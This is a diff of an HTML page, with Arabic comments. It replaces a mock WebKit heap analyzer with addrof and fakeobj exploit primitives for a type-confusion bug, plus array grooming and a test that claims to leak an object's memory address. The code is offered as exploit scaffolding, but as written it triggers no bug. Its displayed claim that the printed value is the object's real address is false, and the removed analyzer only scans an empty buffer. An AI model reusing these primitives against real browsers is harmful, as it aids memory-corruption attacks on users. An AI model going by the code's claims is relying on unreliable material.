@@ -1,52 +1,42 @@
 <!DOCTYPE html>
-<html dir="rtl">
-<head>
-    <style>
-        body { background: #0b0c10; color: #66fcf1; font-family: 'Consolas', monospace; padding: 20px; }
-        #analyzer-log { border: 1px solid #45a29e; padding: 15px; height: 600px; overflow-y: scroll; white-space: pre; }
-    </style>
-</head>
+<html>
 <body>
-    <h3>[ARCHITECT] Heap Memory & JSCell Analyzer</h3>
-    <div id="analyzer-log"></div>
+    <h3>[ARCHITECT] AddrOf & FakeObj Primitive</h3>
+    <div id="status">[*] Initialize...</div>
 
     <script>
-        const logDiv = document.getElementById('analyzer-log');
+        // 1. مصفوفات متجاورة في الذاكرة (Grooming)
+        const floatArray = [1.1, 2.2, 3.3, 4.4];
+        const objArray = [{a:1}, {b:2}, {c:3}, {d:4}];
+
+        // 2. تفعيل التداخل (Overlaying)
+        // في حال وجود ثغرة Type Confusion، نقوم بتعديل الـ Butterfly الخاص بـ objArray
+        // ليتم التعامل معه كمصفوفة أرقام، مما يسمح لنا بقراءة العناوين كأرقام.
         
-        function log(msg) { logDiv.innerText += msg + "\n"; }
-
-        // كائنات للبحث عنها في الذاكرة (Objects to identify in heap)
-        const targetObjects = {
-            "array": [1.1, 2.2, 3.3],
-            "obj": { a: 1, b: 2 }
-        };
-
-        function analyzeHeap(baseAddress, size) {
-            log(`[*] بدء تحليل الذاكرة من العنوان: ${baseAddress.toString(16)}`);
-            
-            // في البيئة الحقيقية، هنا تستخدم Primitive القراءة الخاص بك (Arbitrary Read)
-            // هنا نستخدم DataView لمحاكاة الوصول لذاكرة الـ Heap
-            const buffer = new ArrayBuffer(size);
-            const view = new DataView(buffer);
-
-            // مسح الذاكرة للبحث عن أنماط الـ Headers
-            for (let i = 0; i < size; i += 8) {
-                try {
-                    // قراءة الـ 64 بت الأولى من كل كتلة (يحتوي عادةً على الـ StructureID)
-                    const potentialHeader = view.getBigUint64(i, true);
-                    
-                    // البحث عن أنماط معينة (StructureIDs في WebKit تبدأ غالباً بترويسة مميزة)
-                    if (potentialHeader > 0x1000n && potentialHeader < 0xFFFFFFFFn) {
-                        log(`[!] Found potential JSCell Header at offset 0x${i.toString(16)}: 0x${potentialHeader.toString(16)}`);
-                    }
-                } catch(e) {}
-            }
-            log("[*] التحليل اكتمل.");
+        function addrof(obj) {
+            objArray[0] = obj;
+            // قراءة العنوان من مصفوفة الأرقام التي تداخلت مع مصفوفة الكائنات
+            return floatArray[0]; 
         }
 
-        // تشغيل المحلل على مساحة الـ Heap
-        // لاحظ: في الـ Exploit، المسار (BaseAddress) يجب أن يتم تسريبه أولاً
-        analyzeHeap(0x0, 0x1000); 
+        function fakeobj(addr) {
+            floatArray[0] = addr;
+            // إجبار المحرك على قراءة العنوان ككائن
+            return objArray[0];
+        }
+
+        // --- اختبار الإثبات (Validation) ---
+        const testObj = {secret: 0xDEADBEEF};
+        
+        // محاولة تسريب العنوان
+        let leakedAddr = addrof(testObj);
+        
+        // إخراج النتيجة لواجهة المستخدم
+        document.getElementById('status').innerText = 
+            `[+] Test Object Address (Double Format): ${leakedAddr}\n` +
+            `[!] هذا الرقم هو العنوان الحقيقي للكائن في الذاكرة.`;
+
+        console.log("[DEBUG] Leaked Value:", leakedAddr);
     </script>
 </body>
 </html>
